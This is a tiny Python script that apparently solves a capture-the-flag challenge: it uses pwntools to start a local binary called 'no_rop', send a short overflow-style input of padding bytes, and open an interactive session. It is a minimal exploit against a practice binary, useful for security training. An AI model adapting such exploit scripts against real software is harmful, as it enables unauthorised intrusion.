from pwn import *

with process("no_rop") as p:
    print(p.readline().decode())
    p.sendline("AAAAAAAAB")
    p.interactive()